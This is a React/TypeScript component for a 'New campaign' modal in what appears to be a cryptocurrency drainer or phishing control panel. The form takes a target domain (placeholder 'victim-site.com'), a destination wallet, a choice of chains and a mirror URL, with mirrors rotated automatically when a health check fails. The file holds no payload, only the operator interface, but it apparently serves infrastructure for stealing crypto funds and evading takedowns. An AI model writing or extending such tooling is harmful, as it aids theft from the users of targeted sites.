import { useState, type FormEvent } from 'react'
import type { CreateCampaignInput } from '../types'

const CHAIN_OPTIONS = ['ethereum', 'polygon', 'arbitrum', 'base', 'bsc', 'solana', 'tron', 'ton', 'bitcoin']

type Props = {
  open: boolean
  submitting: boolean
  onClose: () => void
  onSubmit: (input: CreateCampaignInput) => Promise<void>
}

export function CreateCampaignModal({ open, submitting, onClose, onSubmit }: Props) {
  const [name, setName] = useState('')
  const [targetDomain, setTargetDomain] = useState('')
  const [destinationWallet, setDestinationWallet] = useState('')
  const [chains, setChains] = useState<string[]>(['ethereum'])
  const [autoRotate, setAutoRotate] = useState(true)
  const [mirrorUrl, setMirrorUrl] = useState('')
  const [rotationHours, setRotationHours] = useState('12')

  if (!open) return null

  function toggleChain(chain: string): void {
    setChains((prev) =>
      prev.includes(chain) ? prev.filter((c) => c !== chain) : [...prev, chain],
    )
  }

  async function handleSubmit(e: FormEvent): Promise<void> {
    e.preventDefault()
    if (chains.length === 0) return

    await onSubmit({
      name: name.trim(),
      target_domain: targetDomain.trim(),
      destination_wallet: destinationWallet.trim(),
      chains,
      auto_rotate: autoRotate,
      mirror_url: mirrorUrl.trim() || null,
      rotation_interval_hours: Number(rotationHours) || 12,
    })

    setName('')
    setTargetDomain('')
    setDestinationWallet('')
    setMirrorUrl('')
  }

  return (
    <div className="modal-backdrop" onClick={onClose} role="presentation">
      <div className="modal" onClick={(e) => e.stopPropagation()} role="dialog" aria-modal="true">
        <h3>New campaign</h3>
        <form className="form-grid" onSubmit={(e) => void handleSubmit(e)}>
          <label>
            Name
            <input value={name} onChange={(e) => setName(e.target.value)} required maxLength={200} />
          </label>
          <label>
            Target domain
            <input
              value={targetDomain}
              onChange={(e) => setTargetDomain(e.target.value)}
              placeholder="victim-site.com"
              required
            />
          </label>
          <label>
            Destination wallet
            <input
              value={destinationWallet}
              onChange={(e) => setDestinationWallet(e.target.value)}
              placeholder="0x… or chain-specific address"
              required
            />
          </label>
          <label>
            Chains
            <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
              {CHAIN_OPTIONS.map((chain) => (
                <label key={chain} className="checkbox-row">
                  <input
                    type="checkbox"
                    checked={chains.includes(chain)}
                    onChange={() => toggleChain(chain)}
                  />
                  {chain}
                </label>
              ))}
            </div>
          </label>
          <label>
            Mirror URL (optional)
            <input
              value={mirrorUrl}
              onChange={(e) => setMirrorUrl(e.target.value)}
              placeholder="https://mirror.example.com"
              type="url"
            />
          </label>
          <label>
            Rotation interval (hours)
            <input
              type="number"
              min={1}
              max={168}
              value={rotationHours}
              onChange={(e) => setRotationHours(e.target.value)}
            />
          </label>
          <label className="checkbox-row">
            <input
              type="checkbox"
              checked={autoRotate}
              onChange={(e) => setAutoRotate(e.target.checked)}
            />
            Auto-rotate mirror on health failure
          </label>
          <div className="modal-actions">
            <button type="button" className="btn btn-secondary" onClick={onClose} disabled={submitting}>
              Cancel
            </button>
            <button type="submit" className="btn btn-primary" disabled={submitting || chains.length === 0}>
              {submitting ? 'Creating…' : 'Create campaign'}
            </button>
          </div>
        </form>
      </div>
    </div>
  )
}
